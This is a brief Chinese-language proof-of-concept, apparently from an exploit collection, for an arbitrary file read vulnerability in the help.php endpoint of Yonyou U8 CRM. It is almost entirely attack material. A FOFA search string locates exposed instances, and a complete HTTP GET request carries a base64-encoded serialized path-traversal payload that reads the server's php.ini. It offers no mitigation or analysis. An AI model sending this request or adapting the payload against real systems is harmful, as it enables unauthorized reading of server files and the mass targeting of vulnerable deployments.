# 用友crm客户关系管理help.php存在任意文件读取漏洞



## fofa

```yaml
body="用友 U8CRM"
```

## poc

```java
GET /pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

```

